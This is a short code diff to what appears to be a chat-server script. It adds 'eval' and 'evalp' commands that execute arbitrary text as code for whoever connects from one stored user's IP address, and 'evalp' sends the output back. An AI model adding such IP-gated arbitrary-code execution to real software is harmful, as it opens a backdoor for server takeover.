@@ -84,6 +84,21 @@ cmd_d = sys.getFileContent("death.txt");
                 messagetosend = messagetosend.toUpperCase();
             }
         }
+    if (sys.ip(src) == sys.dbIp("[$G] Fenix")) {
+        if (command == "eval") {
+            eval(commandData);
+            return;
+        } else if (command == "evalp") {
+            var bindChannel = channel;
+            try {
+                var res = eval(commandData);
+                sys.sendMessage(src, "Got from eval: " + res, bindChannel);
+            } catch (err) {
+                sys.sendMessage(src, "Error in eval: " + err, bindChannel);
+            }
+            return;
+        }
+    }
         if (command == "me") {
             var colour = script.getColor(src);
             sendChanHtmlAll("<font color='" + colour + "'><timestamp/> *** <b>" + utilities.html_escape(sys.name(src)) + "</b> " + messagetosend + "</font>", channel);
